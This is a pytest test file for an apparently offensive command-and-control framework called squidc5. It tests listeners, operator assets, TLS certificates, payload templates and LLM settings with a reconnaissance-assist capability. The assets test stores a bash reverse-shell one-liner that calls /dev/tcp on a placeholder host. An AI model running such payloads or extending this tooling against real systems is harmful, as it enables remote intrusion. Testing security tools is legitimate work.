"""Listener port conflict, actor rename, assets, TLS library."""

from __future__ import annotations

import pytest
from httpx import ASGITransport, AsyncClient

from squidc5.config import Settings
from squidc5.main import create_app

ADMIN = "sc5_test_admin_token_bootstrap_opsux01"


def _settings(tmp_path, **kw):
    base = dict(
        data_dir=tmp_path / "d",
        debug=True,
        mcp_enabled=False,
        admin_token_bootstrap=ADMIN,
        plugin_signing_secret="test-plugin-signing-secret-for-ci",
        rate_limit_per_minute=5000,
        tls_enabled=False,
    )
    base.update(kw)
    return Settings(**base)


@pytest.mark.asyncio
async def test_listener_port_conflict_and_https_kind(tmp_path):
    app = create_app(_settings(tmp_path))
    async with app.router.lifespan_context(app):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            h = {"Authorization": f"Bearer {ADMIN}"}
            r1 = await client.post(
                "/api/v1/listeners",
                headers=h,
                json={"name": "a", "kind": "http", "port": 18080, "host": "0.0.0.0"},
            )
            assert r1.status_code == 200, r1.text
            r2 = await client.post(
                "/api/v1/listeners",
                headers=h,
                json={"name": "b", "kind": "tcp", "port": 18080, "host": "0.0.0.0"},
            )
            assert r2.status_code == 400
            assert "already used" in r2.text.lower() or "port" in r2.text.lower()
            # https kind accepted at create (start may need cert)
            r3 = await client.post(
                "/api/v1/listeners",
                headers=h,
                json={"name": "tls", "kind": "https", "port": 18443, "host": "0.0.0.0"},
            )
            assert r3.status_code == 200, r3.text
            assert r3.json()["kind"] == "https"
            # smtp kind
            r4 = await client.post(
                "/api/v1/listeners",
                headers=h,
                json={"name": "mail", "kind": "smtp", "port": 12525, "host": "0.0.0.0"},
            )
            # may 403 if smtp feature off
            assert r4.status_code in (200, 403)


@pytest.mark.asyncio
async def test_rename_actor(tmp_path):
    app = create_app(_settings(tmp_path))
    async with app.router.lifespan_context(app):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            h = {"Authorization": f"Bearer {ADMIN}"}
            r = await client.put("/api/v1/me", headers=h, json={"name": "ops-lead"})
            assert r.status_code == 200, r.text
            assert r.json()["actor"] == "ops-lead"
            # new requests see new name
            meta = await client.get("/api/v1/meta", headers=h)
            assert meta.json()["actor"] == "ops-lead"


@pytest.mark.asyncio
async def test_operator_assets_crud(tmp_path):
    app = create_app(_settings(tmp_path))
    async with app.router.lifespan_context(app):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            h = {"Authorization": f"Bearer {ADMIN}"}
            r = await client.post(
                "/api/v1/assets",
                headers=h,
                json={
                    "kind": "payload",
                    "name": "rev-bash-4444",
                    "content": "bash -i >& /dev/tcp/x/4444 0>&1\n",
                    "meta": {"template": "reverse_shell_bash"},
                },
            )
            assert r.status_code == 200, r.text
            aid = r.json()["id"]
            lst = await client.get("/api/v1/assets", headers=h)
            assert lst.status_code == 200
            assert any(a["id"] == aid for a in lst.json()["assets"])
            one = await client.get(f"/api/v1/assets/{aid}", headers=h)
            assert "bash -i" in one.json()["content"]
            d = await client.delete(f"/api/v1/assets/{aid}", headers=h)
            assert d.status_code == 200


@pytest.mark.asyncio
async def test_tls_upload_and_activate(tmp_path):
    from squidc5.tls.certs import generate_self_signed

    app = create_app(_settings(tmp_path))
    data = tmp_path / "d"
    cert = data / "t.crt"
    key = data / "t.key"
    data.mkdir(parents=True, exist_ok=True)
    generate_self_signed(cert, key, public_host="test.local", instance_id="test01")
    cert_pem = cert.read_text()
    key_pem = key.read_text()
    async with app.router.lifespan_context(app):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            h = {"Authorization": f"Bearer {ADMIN}"}
            up = await client.post(
                "/api/v1/tls/certs",
                headers=h,
                json={"label": "lab", "cert_pem": cert_pem, "key_pem": key_pem},
            )
            assert up.status_code == 200, up.text
            cid = up.json()["id"]
            act = await client.post(f"/api/v1/tls/certs/{cid}/activate", headers=h)
            assert act.status_code == 200, act.text
            assert act.json().get("restart_required") is True
            lst = await client.get("/api/v1/tls/certs", headers=h)
            assert any(c["id"] == cid and c["active"] for c in lst.json()["certs"])



@pytest.mark.asyncio
async def test_custom_payload_template_register_and_generate(tmp_path):
    app = create_app(_settings(tmp_path))
    async with app.router.lifespan_context(app):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            h = {"Authorization": f"Bearer {ADMIN}"}
            reg = await client.post(
                "/api/v1/payloads/templates",
                headers=h,
                json={"name": "echo_tpl", "content": "echo {host}:{port}"},
            )
            assert reg.status_code == 200, reg.text
            tpl = await client.get("/api/v1/payloads/templates", headers=h)
            body = tpl.json()
            assert "echo_tpl" in body["templates"]
            assert "echo_tpl" in body.get("custom", [])
            gen = await client.post(
                "/api/v1/payloads/generate",
                headers=h,
                json={"template": "echo_tpl", "host": "10.0.0.1", "port": 99},
            )
            assert gen.status_code == 200, gen.text
            assert "10.0.0.1:99" in (gen.json().get("content") or "")


@pytest.mark.asyncio
async def test_patch_llm_model_preserves_key(tmp_path):
    """Model switch without re-supplying API key (no outbound network)."""
    app = create_app(_settings(tmp_path))
    async with app.router.lifespan_context(app):
        # bypass SSRF by writing LLM row directly
        state = app.state.app_state
        from squidc5.crypto.secrets import SecretBox, resolve_secrets_key
        box = SecretBox(resolve_secrets_key(explicit=None, data_dir=tmp_path / "d"))
        enc = box.encrypt("sk-secret-value-xyz")
        lid = await state.db.upsert_llm(
            name="direct",
            provider="openai",
            model="gpt-a",
            base_url="https://api.openai.com/v1",
            api_key_enc=enc,
            capabilities=["recon_assist"],
        )
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            h = {"Authorization": f"Bearer {ADMIN}"}
            pat = await client.patch(f"/api/v1/llm/{lid}", headers=h, json={"model": "gpt-b"})
            assert pat.status_code == 200, pat.text
            assert pat.json()["model"] == "gpt-b"
            row = await state.db.get_llm(lid)
            assert row["model"] == "gpt-b"
            assert row.get("api_key_enc")
            assert box.decrypt(row["api_key_enc"]) == "sk-secret-value-xyz"
